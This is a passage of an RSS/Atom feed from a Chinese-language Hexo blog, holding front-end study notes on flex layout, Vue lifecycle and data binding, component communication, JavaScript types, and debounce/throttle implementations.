Required</h3><ul><li>响应结果：表示客户端需要通过验证才能使用该网络。该状态码不是由源头服务器生成的，而是由控制网络访问的拦截代理服务器生成的。</li><li>出现原因：网络运营商们有时候会在准许使用网络之前要求用户进行身份验证、接受某些条款，或者进行其他形式的与用户之间的互动（例如在网络咖啡厅或者机场）。他们通常用用户设备的 MAC 地址来进行识别。</li></ul><p>原文：<a href="https://futu.im/article/http-status-code/">https://futu.im/article/http-status-code/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;网络状态码&quot;&gt;&lt;a href=&quot;#网络状态码&quot; class=&quot;headerlink&quot; title=&quot;网络状态码&quot;&gt;&lt;/a&gt;网络状态码&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前</summary>
      
    
    
    
    <category term="网络" scheme="https://zhouhang-hello.gitee.io/hexo_blog/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="网络" scheme="https://zhouhang-hello.gitee.io/hexo_blog/tags/%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>flex 布局</title>
    <link href="https://zhouhang-hello.gitee.io/hexo_blog/2021/10/06/flex/"/>
    <id>https://zhouhang-hello.gitee.io/hexo_blog/2021/10/06/flex/</id>
    <published>2021-10-06T02:00:00.000Z</published>
    <updated>2021-10-11T17:14:12.669Z</updated>
    
    <content type="html"><![CDATA[<h1 id="flex-布局🧚‍♀️"><a href="#flex-布局🧚‍♀️" class="headerlink" title="flex 布局🧚‍♀️"></a>flex 布局🧚‍♀️</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Flex 是 Flexible Box 的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。</p><p>任何一个容器都可以指定为 Flex 布局。</p><p><img src="C:/Users/l%27x/AppData/Roaming/Typora/typora-user-images/image-20211008161112518.png" alt="image-20211008161112518"></p><h2 id="常用属性"><a href="#常用属性" class="headerlink" title="常用属性"></a>常用属性</h2><ul><li>flex-direction</li><li>flex-wrap</li><li>flex-flow (<code>flex-flow</code>属性是<code>flex-direction</code>属性和<code>flex-wrap</code>属性的简写形式)</li><li>justify-content</li><li>align-items</li><li>align-content</li></ul><h3 id="flex-direction属性"><a href="#flex-direction属性" class="headerlink" title="flex-direction属性"></a>flex-direction属性</h3><p><code>flex-direction</code>属性决定主轴的方向（即项目的排列方向）。</p><blockquote><p>row（默认值）：主轴为水平方向，起点在左端。</p><p>row-reverse：主轴为水平方向，起点在右端。<br>column：主轴为垂直方向，起点在上沿。<br>column-reverse：主轴为垂直方向，起点在下沿。</p></blockquote><h3 id="flex-wrap属性"><a href="#flex-wrap属性" class="headerlink" title="flex-wrap属性"></a>flex-wrap属性</h3><p>默认情况下，项目都排在一条线（又称”轴线”）上。<code>flex-wrap</code>属性定义，如果一条轴线排不下，如何换行。</p><blockquote><p><code>nowrap</code>（默认）：不换行。</p><p><code>wrap</code>：换行，第一行在上方。</p><p><code>wrap-reverse</code>：换行，第一行在下方。</p></blockquote><h3 id="flex-flow"><a href="#flex-flow" class="headerlink" title="flex-flow"></a>flex-flow</h3><p><code>flex-flow</code>属性是<code>flex-direction</code>属性和<code>flex-wrap</code>属性的简写形式，默认值为<code>row nowrap</code>。</p><h3 id="justify-content属性"><a href="#justify-content属性" class="headerlink" title="justify-content属性"></a>justify-content属性</h3><p><code>justify-content</code>属性定义了项目在主轴上的对齐方式。</p><blockquote><p>flex-start（默认值）：左对齐</p><p>flex-end：右对齐<br>center： 居中<br>space-between：两端对齐，项目之间的间隔都相等。<br>space-around：每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。</p></blockquote><h3 id="align-items属性"><a href="#align-items属性" class="headerlink" title="align-items属性"></a>align-items属性</h3><p><code>align-items</code>属性定义项目在交叉轴上如何对齐。</p><blockquote><p>flex-start：交叉轴的起点对齐。</p><p>flex-end：交叉轴的终点对齐。<br>center：交叉轴的中点对齐。<br>baseline: 项目的第一行文字的基线对齐。<br>stretch（默认值）：如果项目未设置高度或设为auto，将占满整个容器的高度。</p></blockquote><h3 id="align-content属性"><a href="#align-content属性" class="headerlink" title="align-content属性"></a>align-content属性</h3><p><code>align-content</code>属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用。</p><blockquote><p>flex-start：与交叉轴的起点对齐。</p><p>flex-end：与交叉轴的终点对齐。<br>center：与交叉轴的中点对齐。<br>space-between：与交叉轴两端对齐，轴线之间的间隔平均分布。<br>space-around：每根轴线两侧的间隔都相等。所以，轴线之间的间隔比轴线与边框的间隔大一倍。<br>stretch（默认值）：轴线占满整个交叉轴。</p></blockquote><p>整理原文：阮一峰博客    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;flex-布局🧚‍♀️&quot;&gt;&lt;a href=&quot;#flex-布局🧚‍♀️&quot; class=&quot;headerlink&quot; title=&quot;flex 布局🧚‍♀️&quot;&gt;&lt;/a&gt;flex 布局🧚‍♀️&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;</summary>
      
    
    
    
    <category term="css" scheme="https://zhouhang-hello.gitee.io/hexo_blog/categories/css/"/>
    
    
    <category term="css" scheme="https://zhouhang-hello.gitee.io/hexo_blog/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>异步编程</title>
    <link href="https://zhouhang-hello.gitee.io/hexo_blog/2021/10/06/diff%E7%AE%97%E6%B3%95/"/>
    <id>https://zhouhang-hello.gitee.io/hexo_blog/2021/10/06/diff%E7%AE%97%E6%B3%95/</id>
    <published>2021-10-06T02:00:00.000Z</published>
    <updated>2021-10-11T16:16:49.369Z</updated>
    
    <content type="html"><![CDATA[<h1 id="diff算法"><a href="#diff算法" class="headerlink" title="diff算法"></a>diff算法</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>两个树的完全 diff 算法的时间复杂度为 O(n^3) ，但是在前端中，我们很少会跨层级的移动元素，所以我们只需要比较同一层级的元素进行比较，这样就可以将算法的时间复杂度降低为 O(n)。</p><p>算法首先会对新旧两棵树进行一个深度优先的遍历，这样每个节点都会有一个序号。在深度遍历的时候，每遍历到一个节点，我们就将这个节点和新的树中的节点进行比较，如果有差异，则将这个差异记录到一个对象中。</p><p>在对列表元素进行对比的时候，由于 TagName 是重复的，所以我们不能使用这个来对比。我们需要给每一个子节点加上一个 key，列表对比的时候使用 key 来进行比较，这样我们才能够复用老的 DOM 树上的节点。</p><h2 id="diff算法-1"><a href="#diff算法-1" class="headerlink" title="diff算法"></a>diff算法</h2><ul><li>把树形结构按照层级分解，只比较同级元素。</li><li>给列表结构的每个单元添加唯一的<code>key</code>属性，方便比较。</li><li><code>React</code> 只会匹配相同 <code>class</code> 的 <code>component</code>（这里面的<code>class</code>指的是组件的名字）</li><li>合并操作，调用 <code>component</code> 的 <code>setState</code> 方法的时候, <code>React</code> 将其标记为 - <code>dirty</code>.到每一个事件循环结束, <code>React</code> 检查所有标记 <code>dirty</code>的 <code>component</code>重新绘制.</li><li>选择性子树渲染。开发人员可以重写<code>shouldComponentUpdate</code>提高<code>diff</code>的性能</li></ul>]]></content>
    
    
    <summary type="html">在前端中，我们很少会跨层级的移动元素，所以我们只需要比较同一层级的元素进行比较 - js</summary>
    
    
    
    
    <category term="js" scheme="https://zhouhang-hello.gitee.io/hexo_blog/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>js基本数据内型</title>
    <link href="https://zhouhang-hello.gitee.io/hexo_blog/2021/10/06/js%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    <id>https://zhouhang-hello.gitee.io/hexo_blog/2021/10/06/js%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</id>
    <published>2021-10-06T02:00:00.000Z</published>
    <updated>2021-10-11T17:17:40.130Z</updated>
    
    <content type="html"><![CDATA[<h1 id="js基本数据内型"><a href="#js基本数据内型" class="headerlink" title="js基本数据内型"></a>js基本数据内型</h1><h2 id="基本内型"><a href="#基本内型" class="headerlink" title="基本内型"></a>基本内型</h2><p>基本数据类型：<code>undefined</code>、<code>null</code>、<code>boolean</code>、<code>number</code>、<code>string</code>、<code>symbol</code></p><h2 id="引用内型"><a href="#引用内型" class="headerlink" title="引用内型"></a>引用内型</h2><p>引用数据类型：<code>object</code>、<code>array</code>、<code>function</code></p><h2 id="内置对象"><a href="#内置对象" class="headerlink" title="内置对象"></a>内置对象</h2><ul><li><code>Object</code> 是 <code>JavaScript</code> 中所有对象的父对象</li><li>数据封装类对象：<code>Object</code>、<code>Array</code>、<code>Boolean</code>、<code>Number</code> 和 <code>String</code></li><li>其他对象：<code>Function</code>、<code>Arguments</code>、<code>Math</code>、<code>Date</code>、<code>RegExp</code>、<code>Error</code></li></ul>]]></content>
    
    
    <summary type="html">js基本数据内型总结 - js</summary>
    
    
    
    
    <category term="js" scheme="https://zhouhang-hello.gitee.io/hexo_blog/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>双向绑定</title>
    <link href="https://zhouhang-hello.gitee.io/hexo_blog/2021/10/06/%E6%95%B0%E6%8D%AE%E5%8F%8C%E5%90%91%E7%BB%91%E5%AE%9A/"/>
    <id>https://zhouhang-hello.gitee.io/hexo_blog/2021/10/06/%E6%95%B0%E6%8D%AE%E5%8F%8C%E5%90%91%E7%BB%91%E5%AE%9A/</id>
    <published>2021-10-06T02:00:00.000Z</published>
    <updated>2021-10-11T16:14:29.320Z</updated>
    
    <content type="html"><![CDATA[<h1 id="双向绑定"><a href="#双向绑定" class="headerlink" title="双向绑定"></a>双向绑定</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Vue实现数据双向绑定的原理：Object.defineProperty()</p><h2 id="发布订阅模式"><a href="#发布订阅模式" class="headerlink" title="发布订阅模式"></a>发布订阅模式</h2><p>发布订阅者模式，一种对象间一对多的依赖关系，但一个对象的状态发生改变时，所依赖它的对象都将得到状态改变的通知。</p><p>在发布订阅模式中，添加了一个事件通道，发布者和订阅者不在直接进行交互。所有的注册，解绑，发布都是通过 <code>Event Channel</code> 来实现的。也就是说我们把观察者模式中的逻辑抽象出来，形成了一个单独的模块。</p><p>现在整个的逻辑大概是这样：我们不再是对某个对象进行监听，而是告诉 <code>Event Channel</code>，我想要注册一个名叫 <code>type</code> 的事件，当这个事件触发以后，请执行 <code>fn</code> 函数。事件中心将我的注册信息进行保存。当有一个模块想要执行订阅者的对应方法的时候，只要告诉 <code>Event Channel</code>，我想要触发 <code>type</code> 事件，并且传入参数 <code>arg1, arg2 ...</code>。<code>Event Channel</code> 就会找到对应事件对应的 <code>fn</code> 传入 <code>arg1, arg2 ...</code> 并执行。</p><p>场景模拟：</p><p>订阅者就像是顾客，到老板那里去购买商品，遇到没有货，就给老板一个订单，若货到了发消息给顾客</p><img src="../../../../../hexo/themes/fluid/source/img/tag1.png" style="zoom: 25%;" /><h2 id="双向绑定-1"><a href="#双向绑定-1" class="headerlink" title="双向绑定"></a>双向绑定</h2><ul><li><code>vue</code>实现数据双向绑定主要是：采用数据劫持结合发布者-订阅者模式的方式，通过 <code>Object.defineProperty()</code> 来劫持各个属性的<code>setter</code>，<code>getter</code>，在数据变动时发布消息给订阅者，触发相应监听回调。当把一个普通 <code>Javascript</code> 对象传给 Vue 实例来作为它的 <code>data</code> 选项时，Vue 将遍历它的属性，用 <code>Object.defineProperty()</code> 将它们转为 <code>getter/setter</code>。用户看不到 <code>getter/setter</code>，但是在内部它们让 <code>Vue</code>追踪依赖，在属性被访问和修改时通知变化。</li><li>vue的数据双向绑定 将<code>MVVM</code>作为数据绑定的入口，整合<code>Observer</code>，<code>Compile</code>和<code>Watcher</code>三者，通过<code>Observer</code>来监听自己的<code>model</code>的数据变化，通过<code>Compile</code>来解析编译模板指令（<code>vue</code>中是用来解析 <code>&#123;&#123;&#125;&#125;</code>），最终利用<code>watcher</code>搭起<code>observer</code>和<code>Compile</code>之间的通信桥梁，达到数据变化 —&gt;视图更新；视图交互变化（<code>input</code>）—&gt;数据<code>model</code>变更双向绑定效果。</li></ul>]]></content>
    
    
    <summary type="html">Vue实现数据双向绑定的原理：Object.defineProperty() - js</summary>
    
    
    
    
    <category term="js" scheme="https://zhouhang-hello.gitee.io/hexo_blog/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>异步编程</title>
    <link href="https://zhouhang-hello.gitee.io/hexo_blog/2021/10/06/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"/>
    <id>https://zhouhang-hello.gitee.io/hexo_blog/2021/10/06/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/</id>
    <published>2021-10-06T02:00:00.000Z</published>
    <updated>2021-10-11T15:48:32.149Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vue生命周期"><a href="#vue生命周期" class="headerlink" title="vue生命周期"></a>vue生命周期</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Vue 实例有一个完整的生命周期，也就是从开始创建、初始化数据、编译模版、挂载Dom -&gt; 渲染、更新 -&gt; 渲染、卸载等一系列过程，我们称这是Vue的生命周期</p><p><img src="http://poetries1.gitee.io/img-repo/2020/07/61.png" alt="img"></p><h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><h3 id="beforeCreate"><a href="#beforeCreate" class="headerlink" title="beforeCreate"></a>beforeCreate</h3><p>实例初始化之后调用beforeCreate，此时的数据观察和事件配置都没好准备好此时的实例中的data和el还是undefined,不可用的。</p><h3 id="created"><a href="#created" class="headerlink" title="created"></a>created</h3><p>在实例创建完成后立即调用created,此时，我们能读取到数据data的值，但是dom还没生成，所以属性el还不存在，输出$data为一个Object对象，而$el的值为undefined。</p><h3 id="beforeMount"><a href="#beforeMount" class="headerlink" title="beforeMount"></a>beforeMount</h3><p>在挂载开始之前被调用,上一个阶段我们知道dom还没生成，属性el还为undefined，那么，此阶段为即将挂载,此时的$el不再是undefined，而是成功关联到我们指定的dom节点<div id="app"></div>，但此时还没有被成功地渲染成我们data中的数据。</p><h3 id="mounted"><a href="#mounted" class="headerlink" title="mounted"></a>mounted</h3><p>挂载完毕后调用mounted，到了这个阶段，数据就会被成功渲染出来,此时打印属性el，我们看到已经成功渲染成我们data.name的值</p><h3 id="beforeUpdate"><a href="#beforeUpdate" class="headerlink" title="beforeUpdate"></a>beforeUpdate</h3><p>我们知道，当修改vue实例的data时，vue就会自动帮我们更新渲染视图，在这个过程中，vue提供了beforeUpdate的钩子给我们，在检测到我们要修改数据的时候，更新渲染视图之前就会触发钩子beforeUpdate。</p><p>dada值已经改变，但是视图值没有改变</p><h3 id="Update"><a href="#Update" class="headerlink" title="Update"></a>Update</h3><p>在更新渲染视图之后调用updated,此时再读取视图上的内容，已经是最新的内容，此刻视图已经更新</p><h3 id="beforeDestroy"><a href="#beforeDestroy" class="headerlink" title="beforeDestroy"></a>beforeDestroy</h3><p>调用实例的destroy( )方法可以销毁当前的组件，在销毁前，会触发beforeDestroy钩子。</p><h3 id="destroyed"><a href="#destroyed" class="headerlink" title="destroyed"></a>destroyed</h3><p>成功销毁之后，会触发destroyed钩子，此时该实例与其他实例的关联已经被清除，它与视图之间也被解绑。</p><h3 id="activated"><a href="#activated" class="headerlink" title="activated"></a>activated</h3><p>keep-alive组件被激活时调用。</p><h3 id="deactivated"><a href="#deactivated" class="headerlink" title="deactivated"></a>deactivated</h3><p>keep-alive 组件停用时调用。</p><h2 id="第一次页面加载会触发哪几个钩子？"><a href="#第一次页面加载会触发哪几个钩子？" class="headerlink" title="第一次页面加载会触发哪几个钩子？"></a>第一次页面加载会触发哪几个钩子？</h2><h5 id="beforeCreate、created、beforeMount、mounted"><a href="#beforeCreate、created、beforeMount、mounted" class="headerlink" title="beforeCreate、created、beforeMount、mounted"></a><code>beforeCreate</code>、<code>created</code>、<code>beforeMount</code>、<code>mounted</code></h5><h2 id="DOM-渲染在哪个周期中就已经完成？"><a href="#DOM-渲染在哪个周期中就已经完成？" class="headerlink" title="DOM 渲染在哪个周期中就已经完成？"></a>DOM 渲染在哪个周期中就已经完成？</h2><h5 id="mounted-1"><a href="#mounted-1" class="headerlink" title="mounted"></a><code>mounted</code></h5><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>beforeCreate()</strong></p><p>在实例初始化之后调用，数据观察和事件配置都没好准备好。</p><p><strong>created()</strong></p><p>在实例创建完成后被调用，实例已完成数据观测 (data observer) 和 event/watcher 事件的配置，但是挂载元素还未生成。</p><p><strong>beforeMount()</strong></p><p>在挂载开始之前被调用，挂载元素已成功关联到指定的dom节点，还没有渲染data中的数据。</p><p><strong>mounted()</strong></p><p>挂在完毕之后调用，数据被渲染出来。</p><p><strong>beforeUpdate()</strong></p><p>数据更新前调用，此时视图里还是更新前的数据。</p><p><strong>updated()</strong></p><p>数据更新后调用，此时视图里是更新后的数据。</p><p><strong>beforeDestroy()</strong></p><p>在开始销毁实例时调用。</p><p><strong>destroyed()</strong></p><p>在实例销毁后调用，此时该实例与其他实例的关联已经被清除，它与视图之间也被解绑。</p><p><strong>actived()</strong></p><p>在keep-alive组件被激活前中调用。</p><p><strong>deactived()</strong></p><p>在keep-alive组件被停用后调用。</p>]]></content>
    
    
    <summary type="html">Vue 实例有一个完整的生命周期，也就是从开始创建、初始化数据、编译模版、挂载Dom -&gt; 渲染、更新 -&gt; 渲染、卸载等一系列过程，我们称这是Vue的生命周期 - js</summary>
    
    
    
    
    <category term="js" scheme="https://zhouhang-hello.gitee.io/hexo_blog/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>组件通信</title>
    <link href="https://zhouhang-hello.gitee.io/hexo_blog/2021/10/06/%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1/"/>
    <id>https://zhouhang-hello.gitee.io/hexo_blog/2021/10/06/%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1/</id>
    <published>2021-10-06T02:00:00.000Z</published>
    <updated>2021-10-11T17:02:48.578Z</updated>
    
    <content type="html"><![CDATA[<h1 id="组件通信-key"><a href="#组件通信-key" class="headerlink" title="组件通信 :key:"></a>组件通信 :key:</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>组件化的使用，使得我们常常需要在组件之前传递数据</p><h2 id="（1）父子组件间通信"><a href="#（1）父子组件间通信" class="headerlink" title="（1）父子组件间通信"></a>（1）父子组件间通信</h2><p>第一种方法是子组件通过 props 属性来接受父组件的数据，然后父组件在子组件上注册监听事件，子组件通过 emit 触发事<br>件来向父组件发送数据。</p><p>第二种是通过 ref 属性给子组件设置一个名字。父组件通过 $refs 组件名来获得子组件，子组件通过 $parent 获得父组<br>件，这样也可以实现通信。</p><p>第三种是使用 provider/inject，在父组件中通过 provider 提供变量，在子组件中通过 inject 来将变量注入到组件<br>中。不论子组件有多深，只要调用了 inject 那么就可以注入 provider 中的数据。</p><h2 id="（2）兄弟组件间通信"><a href="#（2）兄弟组件间通信" class="headerlink" title="（2）兄弟组件间通信"></a>（2）兄弟组件间通信</h2><p>第一种是使用 eventBus 的方法，它的本质是通过创建一个空的 Vue 实例来作为消息传递的对象，通信的组件引入这个实<br>例，通信的组件通过在这个实例上监听和触发事件，来实现消息的传递。</p><p>第二种是通过 $parent.$refs 来获取到兄弟组件，也可以进行通信。</p><h2 id="（3）任意组件之间"><a href="#（3）任意组件之间" class="headerlink" title="（3）任意组件之间"></a>（3）任意组件之间</h2><p>使用 eventBus ，其实就是创建一个事件中心，相当于中转站，可以用它来传递事件和接收事件。</p><p>如果业务逻辑复杂，很多组件之间需要同时处理一些公共的数据，这个时候采用上面这一些方法可能不利于项目的维护。这个时候<br>可以使用 vuex ，vuex 的思想就是将这一些公共的数据抽离出来，将它作为一个全局的变量来管理，然后其他组件就可以对这个<br>公共数据进行读写操作，这样达到了解耦的目的。</p>]]></content>
    
    
    <summary type="html">组件化的使用，使得我们常常需要在组件之前传递数据 - js</summary>
    
    
    
    
    <category term="js" scheme="https://zhouhang-hello.gitee.io/hexo_blog/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>节流防抖🗽</title>
    <link href="https://zhouhang-hello.gitee.io/hexo_blog/2021/10/03/%E8%8A%82%E6%B5%81%E9%98%B2%E6%8A%96/"/>
    <id>https://zhouhang-hello.gitee.io/hexo_blog/2021/10/03/%E8%8A%82%E6%B5%81%E9%98%B2%E6%8A%96/</id>
    <published>2021-10-03T02:00:00.000Z</published>
    <updated>2021-10-11T17:00:36.326Z</updated>
    
    <content type="html"><![CDATA[<h3 id="节流防抖🗽"><a href="#节流防抖🗽" class="headerlink" title="节流防抖🗽"></a>节流防抖🗽</h3><ul><li><p>定义🎉🎉🎉：</p><ul><li><strong>防抖：</strong>在任务高频率触发时，只有触发间隔超过制定间隔的任务才会执行。即一个动作连续触发则只执行最后一次。防抖的原理则是不管你在一段时间内如何不停的触发事件，只要设置了防抖，则只在触发n秒后才执行。如果我们在一个事件触发的n秒内又触发了相同的事件，那我们便以新的事件时间为标准，n秒之后再执行。</li></ul></li></ul><div class="hljs code-wrapper"><pre><code><pre><code class="hljs js"><span class="hljs-keyword">let</span> timer = flase;<span class="hljs-built_in">document</span>.addEventListener(<span class="hljs-string">&#x27;scroll&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-built_in">clearTimeout</span>(timer); <span class="hljs-comment">// 清除未执行的定时器（如果之前已经触发过不到300毫秒又触发了一次则清除之前的）重置回初始化状态</span>  timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;函数防抖&quot;</span>)  &#125;, <span class="hljs-number">300</span>)&#125;)</code></pre></div></code></pre><ul><li><p><strong>节流：</strong>在制定间隔内任务只执行1次。节流的原理是不管你在一段时间内如何不停地触发事件，只要设置了节流，就会每隔一段时间执行一次。</p><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">let</span> canRun = <span class="hljs-literal">true</span>;<span class="hljs-built_in">document</span>.addEventListener(<span class="hljs-string">&#x27;scroll&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-keyword">if</span> (!canRun) <span class="hljs-keyword">return</span>;  canRun = <span class="hljs-literal">false</span>;  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;函数节流&#x27;</span>)    canRun = <span class="hljs-literal">true</span>  &#125;, <span class="hljs-number">300</span>)&#125;)</code></pre></div></li></ul><div class="hljs code-wrapper"><pre><code>&lt;img src=&quot;C:\Users\l&#39;x\AppData\Roaming\Typora\typora-user-images\image-20210521162630790.png&quot; alt=&quot;image-20210521162630790&quot; style=&quot;zoom:50%;&quot; /&gt;</code></pre></div><h3 id="原理📣"><a href="#原理📣" class="headerlink" title="原理📣"></a>原理📣</h3><blockquote><p>防抖函数原理：在事件被触发n秒后再执行回调，如果在这n秒内又被触发，则重新计时</p><p>防抖动和节流本质是不一样的。防抖动是将多次执行变为最后一次执行，节流是将多次执行变成每隔一段时间执行</p></blockquote><blockquote><p>如： 像仿百度搜索，就应该用防抖，当我连续不断输入时，不会发送请求；当我一段时间内不输入了，才会发送一次请求；如果小于这段时间继续输入的话，时间会重新计算，也不会发送请求。</p></blockquote><p>  <strong>手写简化版🚔</strong></p>  <div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-comment">// func是用户传入需要防抖的函数</span><span class="hljs-comment">// wait是等待时间</span><span class="hljs-keyword">const</span> debounce = <span class="hljs-function">(<span class="hljs-params">func, wait = <span class="hljs-number">50</span></span>) =&gt;</span> &#123;  <span class="hljs-comment">// 缓存一个定时器id</span>  <span class="hljs-keyword">let</span> timer = <span class="hljs-number">0</span>  <span class="hljs-comment">// 这里返回的函数是每次用户实际调用的防抖函数</span>  <span class="hljs-comment">// 如果已经设定过定时器了就清空上一次的定时器</span>  <span class="hljs-comment">// 开始一个新的定时器，延迟执行用户传入的方法</span>  <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) </span>&#123;    <span class="hljs-keyword">if</span> (timer) <span class="hljs-built_in">clearTimeout</span>(timer)    timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;      func.apply(<span class="hljs-built_in">this</span>, args)    &#125;, wait)  &#125;&#125;</code></pre></div><blockquote><p>节流函数原理:规定在一个单位时间内，只能触发一次函数。如果这个单位时间内触发多次函数，只有一次生效</p></blockquote><blockquote><p>例:（连续不断动都需要调用时用，设一时间间隔），像dom的拖拽，如果用消抖的话，就会出现卡顿的感觉，因为只在停止的时候执行了一次，这个时候就应该用节流，在一定时间内多次执行，会流畅很多</p></blockquote><p>  <strong>手写简版🚔</strong></p>  <div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-comment">// func是用户传入需要防抖的函数</span><span class="hljs-comment">// wait是等待时间</span><span class="hljs-keyword">const</span> throttle = <span class="hljs-function">(<span class="hljs-params">func, wait = <span class="hljs-number">50</span></span>) =&gt;</span> &#123;  <span class="hljs-comment">// 上一次执行该函数的时间</span>  <span class="hljs-keyword">let</span> lastTime = <span class="hljs-number">0</span>  <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) </span>&#123;    <span class="hljs-comment">// 当前时间</span>    <span class="hljs-keyword">let</span> now = +<span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>()    <span class="hljs-comment">// 将当前时间和上一次执行函数时间对比</span>    <span class="hljs-comment">// 如果差值大于设置的等待时间就执行函数</span>    <span class="hljs-keyword">if</span> (now - lastTime &gt; wait) &#123;      lastTime = now      func.apply(<span class="hljs-built_in">this</span>, args)    &#125;  &#125;&#125;<span class="hljs-built_in">setInterval</span>(  throttle(<span class="hljs-function">() =&gt;</span> &#123;    <span class="hljs-built_in">console</span>.log(<span class="hljs-number">1</span>)  &#125;, <span class="hljs-number">500</span>),  <span class="hljs-number">1</span>)</code></pre></div><h3 id="函数防抖的应用场景🎟️"><a href="#函数防抖的应用场景🎟️" class="headerlink" title="函数防抖的应用场景🎟️"></a>函数防抖的应用场景🎟️</h3><p>  连续的事件，只需触发一次回调的场景有：</p><ul><li><p>搜索框搜索输入。只需用户最后一次输入完，再发送请求</p></li><li><p>手机号、邮箱验证输入检测</p></li><li><p>窗口大小Resize。只需窗口调整完成后，计算窗口大小。防止重复渲染。</p><h3 id="函数节流的应用场景🎟️"><a href="#函数节流的应用场景🎟️" class="headerlink" title="函数节流的应用场景🎟️"></a>函数节流的应用场景🎟️</h3><p>间隔一段时间执行一次回调的场景有：</p></li><li><p>滚动加载，加载更多或滚到底部监听</p></li><li><p>谷歌搜索框，搜索联想功能</p></li><li><p>高频点击提交，表单重复提交</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;节流防抖🗽&quot;&gt;&lt;a href=&quot;#节流防抖🗽&quot; class=&quot;headerlink&quot; title=&quot;节流防抖🗽&quot;&gt;&lt;/a&gt;节流防抖🗽&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;定义🎉🎉🎉：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;防抖：&lt;/strong&gt;在任</summary>
      
    
    
    
    <category term="js" scheme="https://zhouhang-hello.gitee.io/hexo_blog/categories/js/"/>
    
    
    <category term="js" scheme="https://zhouhang-hello.gitee.io/hexo_blog/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>instanceof 的原理</title>
    <link href="https://zhouhang-hello.gitee.io/hexo_blog/2021/10/02/instanceof%20%E7%9A%84%E5%8E%9F%E7%90%86/"/>
    <id>https://zhouhang-hello.gitee.io/hexo_blog/2021/10/02/instanceof%20%E7%9A%84%E5%8E%9F%E7%90%86/</id>
    <published>2021-10-02T02:00:00.000Z</published>
    <updated>2021-10-11T17:17:11.127Z</updated>
    
    <content type="html"><![CDATA[<h1 id="instanceof-的原理"><a href="#instanceof-的原理" class="headerlink" title="instanceof 的原理"></a>instanceof 的原理</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>typeof和instanceof都用于检查数据的内型，但是和typeof的检测原理和适用范围却不一样，instanceof 可以正确的判断对象的类型，因为内部机制是通过判断对象的原型链中是不是能找到类型的 prototype</p><div class="hljs code-wrapper"><pre><code class="hljs awk">typeof <span class="hljs-number">1</span> <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;number&#x27;</span>typeof <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;string&#x27;</span>typeof undefined <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;undefined&#x27;</span>typeof true <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;boolean&#x27;</span>typeof Symbol() <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;symbol&#x27;</span>typeof null <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;object&#x27;</span>typeof [] <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;object&#x27;</span>typeof &#123;&#125; <span 